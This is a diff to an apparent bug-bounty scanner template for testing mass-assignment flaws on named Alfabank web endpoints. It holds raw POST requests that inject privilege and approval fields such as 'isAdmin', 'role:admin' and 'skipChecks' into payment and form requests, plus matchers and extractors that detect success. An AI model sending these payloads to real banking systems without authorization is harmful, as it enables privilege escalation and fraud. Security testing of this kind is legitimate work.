@@ -4,8 +4,10 @@ info:
   name: Alfabank - Mass Assignment Vulnerabilities
   author: bugbounty
   severity: high
-  description: Mass assignment in payment and form endpoints
+  description: Mass assignment with privilege escalation validation
   tags: mass-assignment,alfabank
+  reference:
+    - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
 
 http:
   - raw:
@@ -13,33 +15,44 @@ http:
         POST /cc-short/step1 HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
+        Accept: application/json
 
         {"card":"visa_classic","isAdmin":true,"role":"admin","approved":true}
-
-      - |
-        POST /alfaform/ HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-
-        product=dc-short&isApproved=true&creditLimit=999999999
 
       - |
         POST /rest/Init HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
+        Accept: application/json
 
-        {"Amount":1000,"OrderId":"test","isVerified":true,"skipChecks":true}
+        {"Amount":1000,"OrderId":"{{randstr}}","isVerified":true,"skipChecks":true,"isAdmin":true}
 
+    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-          - 201
-
       - type: word
-        part: body
+        part: content_type
         words:
-          - "success"
-          - "approved"
-          - "admin"
+          - "application/json"
+
+      - type: regex
+        part: body
+        regex:
+          - '"(isAdmin|role)"?\s*:\s*(true|"admin")'
+          - '"(approved|isVerified)"?\s*:\s*true'
+          - '"(skipChecks|bypass)"?\s*:\s*true'
         condition: or
+
+      - type: dsl
+        dsl:
+          - 'status_code == 200 || status_code == 201'
+          - '!contains(tolower(body), "error")'
+          - '!contains(tolower(body), "invalid")'
+        condition: and
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - '.isAdmin'
+          - '.role'
+          - '.approved'
